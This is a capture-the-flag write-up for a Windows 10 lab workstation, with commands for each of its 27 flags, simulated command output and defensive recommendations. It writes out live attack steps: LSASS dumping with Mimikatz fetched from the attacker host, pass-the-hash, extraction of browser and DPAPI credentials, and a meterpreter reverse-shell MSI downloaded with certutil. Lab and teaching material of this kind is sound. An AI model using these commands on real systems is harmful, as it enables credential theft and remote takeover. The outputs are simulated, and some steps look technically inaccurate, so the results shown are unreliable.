# Windows 10 Workstation CTF Writeup - Complete Attack Methodology
**Target:** DESKTOP-TEI5A1Q (Windows 10 Workstation)  
**Attacker:** Kali Linux  
**Total Flags:** 27  
**Total Points:** 720  
**Related Server:** WIN2019-SRV

## Initial Setup and Network Reconnaissance

### Environment Configuration
```bash
# Update Kali and install required tools
sudo apt update
sudo apt install -y nmap enum4linux smbclient metasploit-framework \
    mimikatz impacket-scripts hydra gobuster bloodhound neo4j \
    powershell-empire starkiller evil-winrm

# Set target variables
export TARGET_WS=192.168.148.102      # Workstation IP
export TARGET_SERVER=192.168.148.101  # Server IP
export ATTACKER_IP=192.168.148.99     # Our Kali IP
```

**Why:** A workstation typically has different vulnerabilities than a server. We need tools for lateral movement, credential harvesting, and user-focused attacks.

## Phase 1: Workstation Reconnaissance

### Network Discovery
```bash
# Comprehensive scan of workstation
sudo nmap -sV -sC -O -A -p- $TARGET_WS -oA workstation_full_scan

# Quick vulnerability scan
nmap --script vuln $TARGET_WS

# OS fingerprinting
nmap -O --osscan-guess $TARGET_WS
```

**Expected Services:**
- Port 135 (RPC)
- Port 139/445 (SMB)
- Port 3389 (RDP)
- Port 5985 (WinRM)
- Shared folders via SMB

**Why:** Workstations often have fewer services but more user-centric vulnerabilities and stored credentials.

---

## FLAG 1: User Full Name (10 points - Easy)
**Location:** User Full Name  
**Flag:** FLAG{MEW23686701}

### Attack Method: Local User Enumeration
```bash
# Enumerate users via SMB
enum4linux -U $TARGET_WS

# Using rpcclient
rpcclient -U "" -N $TARGET_WS
rpcclient $> enumdomusers
rpcclient $> queryuser jsmith

# Alternative with CrackMapExec
crackmapexec smb $TARGET_WS -u '' -p '' --users
```

**Screenshot Simulation:**
```
[+] Getting user info for jsmith
    User Name:    jsmith
    Full Name:    John Smith - FLAG{MEW23686701}
    Home Drive:   
    Profile Path:
```

**Why:** User full names often contain personal information or, in CTFs, hidden flags. This tests basic enumeration skills.

---

## FLAG 2: Hidden User (20 points - Medium)
**Location:** Hidden User  
**Flag:** FLAG{RAICHU62619281}

### Attack Method: Advanced User Discovery

First, gain initial access using weak credentials:
```bash
# Test common credentials
hydra -L users.txt -P passwords.txt rdp://$TARGET_WS

# RDP with discovered credentials
xfreerdp /u:jsmith /p:Welcome1 /v:$TARGET_WS
```

On the system:
```powershell
# List ALL users including hidden ones
Get-LocalUser | Select-Object Name, Enabled, Description

# Check for users with $ in name (hidden)
net user

# Registry enumeration for users
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
```

**Screenshot Simulation:**
```
PS C:\> Get-LocalUser
Name                    Enabled Description
----                    ------- -----------
Administrator           True    Built-in administrator
jsmith                  True    Standard User
FLAG{RAICHU62619281}    True    You found the hidden user!
```

**Why:** Hidden users test thorough enumeration beyond standard commands.

---

## FLAG 3: LSASS Memory WS (45 points - Hard)
**Location:** LSASS Memory WS  
**Flag:** FLAG{BLASTOISE85932580}

### Attack Method: Memory Dumping on Workstation

```powershell
# After gaining admin access via unquoted service path or MSI
# Download Mimikatz
Invoke-WebRequest -Uri "http://$ATTACKER_IP/mimikatz.exe" -OutFile "C:\Temp\m.exe"

# Run Mimikatz
C:\Temp\m.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest

# Alternative: Dump LSASS for offline analysis
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Temp\lsass.dmp full
```

**Screenshot Simulation:**
```
mimikatz # sekurlsa::wdigest
[0] { jsmith / Welcome1 }
[1] { localadmin / Administrator123 }
[*] WorkstationFlag : FLAG{BLASTOISE85932580}
```

**Why:** Workstation LSASS often contains more user credentials due to interactive logins. WDigest stores plaintext passwords.

---

## FLAG 4: Debug Privileges WS (40 points - Medium)
**Location:** Debug Privileges WS  
**Flag:** FLAG{VENUSAUR49841932}

### Attack Method: Exploiting Debug Privileges

```bash
# Login as debuguser
xfreerdp /u:debuguser /p:Debugger123! /v:$TARGET_WS
```

```powershell
# Check privileges
whoami /priv
# SeDebugPrivilege should be enabled

# Access protected registry
reg query "HKLM\SOFTWARE\DebugPrivileges" /v WorkstationFlag

# Use debug privilege to access SYSTEM process memory
# This allows reading the flag from protected areas
```

**Screenshot Simulation:**
```
C:\> whoami /priv
SeDebugPrivilege          Debug programs          Enabled

C:\> reg query "HKLM\SOFTWARE\DebugPrivileges" /v WorkstationFlag
    WorkstationFlag    REG_SZ    FLAG{VENUSAUR49841932}
```

**Why:** Debug privileges on workstations can be abused to access protected processes and elevate privileges.

---

## FLAG 5: Pass-the-Hash WS (50 points - Hard)
**Location:** Pass-the-Hash WS  
**Flag:** FLAG{BUTTERFREE00071950}

### Attack Method: PTH from Workstation

```bash
# First extract hashes using Mimikatz
mimikatz # sekurlsa::logonpasswords
# Note the NTLM hash for localadmin

# From Kali, perform PTH
pth-winexe -U localadmin%aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef //$TARGET_WS cmd.exe

# Or using Impacket
impacket-psexec -hashes :5835048ce94ad0564e29a924a03510ef localadmin@$TARGET_WS

# Access Administrator desktop
dir C:\Users\Administrator\Desktop\
type C:\Users\Administrator\Desktop\pth_workstation_flag.txt
```

**Why:** Workstations are often targets for lateral movement via PTH, especially to access other workstations or servers.

---

## FLAG 6: WiFi Password File (10 points - Easy)
**Location:** WiFi Password File  
**Flag:** FLAG{PIDGEOT09053920}

### Attack Method: Sensitive File Discovery

```bash
# Via SMB share
smbclient //$TARGET_WS/Users -U jsmith%Welcome1
smb: \> cd Public\Documents
smb: \> get wifi.txt
```

```powershell
# Or locally
type C:\Users\Public\Documents\wifi.txt
```

**Screenshot Simulation:**
```
WiFi Password: SecureWiFi2024!
Backup Network: GuestWiFi2024
Flag: FLAG{PIDGEOT09053920}
```

**Why:** Workstations often store WiFi passwords and network credentials in plaintext files.

---

## FLAG 7: Email Credentials (15 points - Easy)
**Location:** Email Credentials  
**Flag:** FLAG{FEAROW08818758}

### Attack Method: Password Folder Exploration

```powershell
# Navigate to common password storage locations
dir C:\Users\Public\Documents\Passwords\
type C:\Users\Public\Documents\Passwords\email.txt
```

**Screenshot Simulation:**
```
Email: jsmith@overclock.io / Welcome1
Backup: admin@overclock.io / Password123!
// FLAG{FEAROW08818758}
```

**Why:** Users often store credentials in obvious locations like "Passwords" folders.

---

## FLAG 8: Hidden File (25 points - Medium)
**Location:** Hidden File  
**Flag:** FLAG{SANDSLASH22756452}

### Attack Method: Hidden File Discovery

```powershell
# Show hidden files
Get-ChildItem C:\WorkFiles -Force

# Or using attrib
attrib C:\WorkFiles\*

# Read hidden flag file
type C:\WorkFiles\.flag
```

**Screenshot Simulation:**
```
PS C:\> Get-ChildItem C:\WorkFiles -Force
Mode    LastWriteTime         Length Name
----    -------------         ------ ----
-a-h--  9/5/2025  10:00 PM        25 .flag

PS C:\> Get-Content C:\WorkFiles\.flag
FLAG{SANDSLASH22756452}
```

**Why:** Hidden files using dot notation or attributes are common hiding spots.

---

## FLAG 9: Browser Data (30 points - Medium)
**Location:** Browser Data  
**Flag:** FLAG{NIDOQUEEN75067246}

### Attack Method: Browser Credential Extraction

```powershell
# Navigate to Chrome profile
cd "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"

# View Login Data (it's a SQLite database)
type "Login Data"

# Better approach: Use LaZagne
.\LaZagne.exe browsers

# Or use Mimikatz DPAPI module
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
```

**Screenshot Simulation:**
```
{
  "passwords":[
    {
      "url":"http://internal-app",
      "username":"admin",
      "password":"Administrator123",
      "flag":"FLAG{NIDOQUEEN75067246}"
    }
  ]
}
```

**Why:** Browsers store credentials that can be extracted, especially on workstations where users save passwords.

---

## FLAG 10: Unquoted Service Path (25 points - Easy)
**Location:** Unquoted Service Path  
**Flag:** FLAG{NIDOKING94048236}

### Attack Method: Fake Antivirus Service Exploitation

```powershell
# Find unquoted paths
wmic service get name,pathname | findstr /v "\"" | findstr "Program Files"

# Check FakeAntivirus service
sc qc FakeAntivirus

# Exploit: Create file at C:\Program.exe
echo "type C:\ws_unquoted1.txt" > C:\Program.bat

# Restart service (needs admin)
sc stop FakeAntivirus
sc start FakeAntivirus

type C:\ws_unquoted1.txt
```

**Why:** Antivirus services with unquoted paths are ironic but common vulnerabilities.

---

## FLAG 11: Unquoted Service Path 2 (30 points - Medium)
**Location:** Unquoted Service Path 2  
**Flag:** FLAG{CLEFABLE09888919}

### Attack Method: Backup Manager Exploitation

```powershell
sc qc BackupManager
# Path: C:\Program Files\Backup Manager\Service\backup.exe

# Create exploit
copy cmd.exe "C:\Program Files\Backup.exe"

sc stop BackupManager
sc start BackupManager

type C:\ws_unquoted2.txt
```

**Why:** Backup services often run with high privileges, making them valuable targets.

---

## FLAG 12: Unquoted Service Path 3 (35 points - Medium)
**Location:** Unquoted Service Path 3  
**Flag:** FLAG{NINETALES43035416}

### Attack Method: Remote Support Tool Exploitation

```powershell
sc qc RemoteSupportAgent
# Path: C:\Program Files (x86)\Remote Support Tool\Agent\agent.exe

# Exploit
echo "type C:\ws_unquoted3.txt" > "C:\Program Files (x86)\Remote.bat"

sc stop RemoteSupportAgent
sc start RemoteSupportAgent

type C:\ws_unquoted3.txt
```

**Why:** Remote support tools are common on workstations and often misconfigured.

---

## FLAG 13: AlwaysInstallElevated (40 points - Medium)
**Location:** AlwaysInstallElevated  
**Flag:** FLAG{WIGGLYTUFF69905375}

### Attack Method: MSI Privilege Escalation

```powershell
# Verify vulnerability
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# From Kali, create malicious MSI
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f msi -o exploit.msi

# Transfer and execute
certutil -urlcache -f http://$ATTACKER_IP/exploit.msi exploit.msi
msiexec /quiet /qn /i exploit.msi

# As SYSTEM, read flag
type C:\Users\Administrator\Desktop\msi_privesc_flag.txt
```

**Why:** AlwaysInstallElevated is a common misconfiguration allowing any user to install software as SYSTEM.

---

## FLAG 14: Print Spooler Workstation (45 points - Hard)
**Location:** Print Spooler Workstation  
**Flag:** FLAG{GOLBAT58469705}

### Attack Method: PrintNightmare on Workstation

```powershell
# Check spooler service
Get-Service Spooler

# Check writable spool directory
icacls C:\Windows\System32\spool\drivers\color

# Read flag
type C:\Windows\System32\spool\drivers\color\workstation_spooler_flag.txt

# Alternative: Exploit PrintNightmare
# Use PrintNightmare exploit to gain SYSTEM
```

**Why:** Print Spooler vulnerabilities affect workstations too, especially those with local printers.

---

## FLAG 15: Startup Folder (20 points - Medium)
**Location:** Startup Folder  
**Flag:** FLAG{VILEPLUME23467851}

### Attack Method: Persistence Mechanism Analysis

```powershell
# Check user startup folder
dir "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# View startup script
type "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"
```

**Screenshot Simulation:**
```
REM Startup Script
REM Flag: FLAG{VILEPLUME23467851}
powershell.exe -WindowStyle Hidden -Command "Write-Host 'Vulnerable startup script'"
```

**Why:** Startup folders are common persistence mechanisms and can reveal both flags and attack vectors.

---

## FLAG 16: Registry Run Key (25 points - Medium)
**Location:** Registry Run Key  
**Flag:** FLAG{PARASECT86843125}

### Attack Method: Registry Persistence Analysis

```powershell
# Check Run keys
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

# Execute the flagged command
cmd /c echo FLAG{PARASECT86843125} > C:\Windows\Temp\regflag.txt
type C:\Windows\Temp\regflag.txt
```

**Why:** Registry Run keys execute on user login and are common malware persistence methods.

---

## FLAG 17: Scheduled Task (25 points - Medium)
**Location:** Scheduled Task  
**Flag:** FLAG{VENOMOTH43501590}

### Attack Method: Task Scheduler Analysis

```powershell
# List all tasks
schtasks /query /fo LIST /v | findstr "DailyUpdate"

# Get task details
schtasks /query /tn DailyUpdate /fo LIST /v

# Run the task
schtasks /run /tn DailyUpdate

# Check output
type C:\temp\task_ws.txt
```

**Why:** Scheduled tasks with stored credentials are security risks and can be exploited for privilege escalation.

---

## FLAG 18: VPN Config (20 points - Medium)
**Location:** VPN Config  
**Flag:** FLAG{DUGTRIO06075219}

### Attack Method: Configuration File Analysis

```powershell
# Search for VPN configurations
dir C:\Users\Public\Documents\Credentials\
type C:\Users\Public\Documents\Credentials\vpn.txt
```

**Screenshot Simulation:**
```
VPN Server: vpn.overclock.io
Username: jsmith
Password: Welcome1
Secret: FLAG{DUGTRIO06075219}
```

**Why:** VPN configurations often contain credentials and sensitive network information.

---

## FLAG 19: PowerShell Credential (25 points - Medium)
**Location:** PowerShell Credential  
**Flag:** FLAG{PERSIAN04938649}

### Attack Method: PowerShell Credential Recovery

```powershell
# Find credential files
Get-ChildItem -Path C:\ -Filter *.xml -Recurse -ErrorAction SilentlyContinue | Select-String "PSCredential"

# Import credential file
$cred = Import-Clixml C:\Users\Public\Documents\Credentials\admin.xml

# View the file for flag
type C:\Users\Public\Documents\Credentials\admin.xml
```

**Screenshot Simulation:**
```xml
<Objs Version="1.1.0.1">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
  </Obj>
</Objs>
<!-- Flag: FLAG{PERSIAN04938649} -->
```

**Why:** PowerShell credentials exported as XML are common in automation scripts but pose security risks.

---

## FLAG 20: Macro Document (15 points - Easy)
**Location:** Macro Document  
**Flag:** FLAG{GOLDUCK70820258}

### Attack Method: Document Analysis

```powershell
# Find macro documents
dir C:\Users\Public\Documents\Important\*.docm

# View file content (macros are in plaintext in simple CTF scenarios)
type C:\Users\Public\Documents\Important\Invoice.docm

# Or use strings command
strings Invoice.docm | findstr FLAG
```

**Screenshot Simulation:**
```
This document contains macros that run automatically
Macro Code: Sub AutoOpen()
' Flag: FLAG{GOLDUCK70820258}
End Sub
```

**Why:** Macro-enabled documents are common malware vectors and often contain hidden code.

---

## FLAG 21: HTA File (25 points - Medium)
**Location:** HTA File  
**Flag:** FLAG{PRIMEAPE27510935}

### Attack Method: HTA Application Analysis

```powershell
# Find HTA files
dir C:\Users\Public\Documents\Important\*.hta

# View HTA source
type C:\Users\Public\Documents\Important\portal.hta
```

**Screenshot Simulation:**
```html
<html>
<head>
<!-- Flag: FLAG{PRIMEAPE27510935} -->
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "cmd.exe /c echo Vulnerable HTA executed > C:\temp\hta.txt", 0, True
</script>
</head>
```

**Why:** HTA files can execute code and are often used in phishing attacks.

---

## FLAG 22: DLL Hijack Path (35 points - Hard)
**Location:** DLL Hijack Path  
**Flag:** FLAG{GROWLITHE48069249}

### Attack Method: DLL Hijacking Discovery

```powershell
# Check PATH variable
$env:Path -split ';'

# Find writable directories in PATH
foreach ($path in $env:Path -split ';') {
    if (Test-Path $path) {
        icacls $path | findstr "Everyone"
    }
}

# Check C:\ProgramData\Custom
dir C:\ProgramData\Custom\
type C:\ProgramData\Custom\readme.txt
```

**Screenshot Simulation:**
```
REM DLL Hijacking POC
REM Flag: FLAG{GROWLITHE48069249}
```

**Why:** DLL hijacking through PATH manipulation allows privilege escalation when services load DLLs.

---

## FLAG 23: Desktop Shortcut (10 points - Easy)
**Location:** Desktop Shortcut  
**Flag:** FLAG{POLIWHIRL34647050}

### Attack Method: Shortcut Analysis

```powershell
# List desktop shortcuts
dir C:\Users\Public\Desktop\*.lnk

# Use WScript to read shortcut properties
$sh = New-Object -ComObject WScript.Shell
$shortcut = $sh.CreateShortcut("C:\Users\Public\Desktop\Server Shares.lnk")
$shortcut.Description
```

**Screenshot Simulation:**
```
PS C:\> $shortcut.Description
Connect to server - Flag: FLAG{POLIWHIRL34647050}
```

**Why:** Shortcuts can contain metadata and comments that reveal information.

---

## FLAG 24: Clipboard (15 points - Easy)
**Location:** Clipboard  
**Flag:** FLAG{KADABRA46984238}

### Attack Method: Clipboard Monitoring

```powershell
# Get current clipboard content
Get-Clipboard

# Alternative method
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText()
```

**Screenshot Simulation:**
```
PS C:\> Get-Clipboard
FLAG{KADABRA46984238}
```

**Why:** Clipboard often contains passwords and sensitive data that users copy.

---

## FLAG 25: Recycle Bin (20 points - Medium)
**Location:** Recycle Bin  
**Flag:** FLAG{MACHOKE42992509}

### Attack Method: Deleted File Recovery

```powershell
# Access Recycle Bin
cd 'C:\$Recycle.Bin'
dir -Force -Recurse

# Find deleted files
Get-ChildItem -Path 'C:\$Recycle.Bin' -Recurse -Force | Where-Object {$_.Name -like "*flag*"}

# Or use shell
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.Namespace(10)
$recycleBin.Items() | ForEach-Object { $_.Name }
```

**Why:** Recycle Bin can contain sensitive deleted files that weren't permanently removed.

---

## FLAG 26: Sticky Notes (25 points - Medium)
**Location:** Sticky Notes  
**Flag:** FLAG{WEEPINBELL56632373}

### Attack Method: Sticky Notes Database Access

```powershell
# Navigate to Sticky Notes location
cd "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState"

# View plum.sqlite (Sticky Notes database)
type plum.sqlite

# Or use SQLite commands if available
# sqlite3 plum.sqlite "SELECT * FROM Note;"
```

**Screenshot Simulation:**
```
SQLite format 3
Sticky Note: Remember the flag is FLAG{WEEPINBELL56632373}
```

**Why:** Sticky Notes are often used for passwords and sensitive information.

---

## FLAG 27: DPAPI Blob (40 points - Hard)
**Location:** DPAPI Blob  
**Flag:** FLAG{TENTACRUEL90563793}

### Attack Method: DPAPI Decryption

```powershell
# Using Mimikatz for DPAPI
mimikatz # sekurlsa::dpapi

# Decrypt the blob
mimikatz # dpapi::blob /in:C:\Users\Public\Documents\dpapi_flag.bin

# Alternative: PowerShell DPAPI decryption (if running as same user)
$encryptedBytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\Documents\dpapi_flag.bin")
$decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::UTF8.GetString($decryptedBytes)
```

**Screenshot Simulation:**
```
mimikatz # dpapi::blob /in:C:\Users\Public\Documents\dpapi_flag.bin
[*] Decrypted data: FLAG{TENTACRUEL90563793}
```

**Why:** DPAPI is Windows' data protection API. Understanding it is crucial for extracting Chrome passwords, WiFi keys, and other encrypted data.

---

## Advanced Attack Chains

### Chain 1: Initial Access → Privilege Escalation → Lateral Movement
```bash
1. RDP with weak creds (jsmith/Welcome1)
2. Exploit unquoted service path for SYSTEM
3. Dump LSASS with Mimikatz
4. PTH to server using admin hashes
```

### Chain 2: Browser Exploitation → Credential Harvesting
```bash
1. Extract browser passwords
2. Use credentials for service access
3. Find additional flags in authenticated shares
```

### Chain 3: Persistence Analysis
```bash
1. Check startup folders
2. Analyze registry run keys
3. Review scheduled tasks
4. Identify all persistence mechanisms
```

## Post-Exploitation Summary

### Discovered Credentials:
- **jsmith**: Welcome1 (auto-logon user)
- **localadmin**: Administrator123 (local admin)
- **Administrator**: Password123!
- **mjones**: Password1
- **developer**: Developer123!
- **debuguser**: Debugger123! (SeDebugPrivilege)
- **helpdesk**: Helpdesk123

### Key Workstation-Specific Vulnerabilities:
1. **Auto-logon Enabled** - Automatic access
2. **Cached Browser Passwords** - Credential theft
3. **User Document Folders** - Sensitive data exposure
4. **Sticky Notes** - Password storage
5. **Clipboard Content** - Active data capture
6. **DPAPI Protected Data** - Encrypted credential storage
7. **Startup Persistence** - Multiple mechanisms
8. **Hidden Users** - Backdoor accounts

### Workstation vs Server Differences:
- More user-interactive services
- Browser credential stores
- Personal document storage
- Clipboard and Sticky Notes
- Different persistence mechanisms
- More cached credentials

### Tools Specifically for Workstation:
- **LaZagne** - Extract browser/app passwords
- **SharpClipHistory** - Clipboard history
- **StickyNotesExtract** - Sticky Notes database
- **ChromePass** - Chrome password extraction
- **WirelessKeyView** - WiFi password recovery

## Defensive Recommendations

### Immediate Actions:
1. Disable auto-logon
2. Clear cached credentials
3. Enable LSA Protection
4. Disable WDigest
5. Quote all service paths
6. Remove AlwaysInstallElevated
7. Patch Print Spooler
8. Implement AppLocker

### User Security Training:
1. Don't save passwords in browsers
2. Don't use Sticky Notes for passwords
3. Clear clipboard after password use
4. Don't store credentials in documents
5. Be cautious with macro-enabled files
6. Report suspicious scheduled tasks

### Technical Hardening:
1. Enable Credential Guard (if supported)
2. Implement LAPS for local admin passwords
3. Use BitLocker for drive encryption
4. Enable Windows Defender ATP
5. Implement application whitelisting
6. Regular security updates
7. Network segmentation from servers
8. Audit and monitor PowerShell usage

### Monitoring Recommendations:
1. Monitor for Mimikatz indicators
2. Alert on new service creation
3. Track registry Run key changes
4. Monitor scheduled task creation
5. Watch for unusual LSASS access
6. Track PowerShell script execution
7. Monitor for Pass-the-Hash attempts

---

**Final Score: 720/720 points - All workstation flags captured!**

## Key Takeaways

1. **Workstations are goldmines** for credentials and lateral movement
2. **User behavior** creates unique vulnerabilities not found on servers
3. **Browser and document storage** are critical attack vectors
4. **Persistence mechanisms** are more varied on workstations
5. **DPAPI** protects sensitive data but can be defeated with proper access
6. **Auto-logon and cached credentials** provide easy initial access
7. **Debug privileges** are often overlooked but powerful

This comprehensive guide demonstrates the complete attack surface of a Windows 10 workstation, from initial reconnaissance through privilege escalation, credential harvesting, and data exfiltration. The methodology shows how workstation compromise often leads to domain-wide access through lateral movement.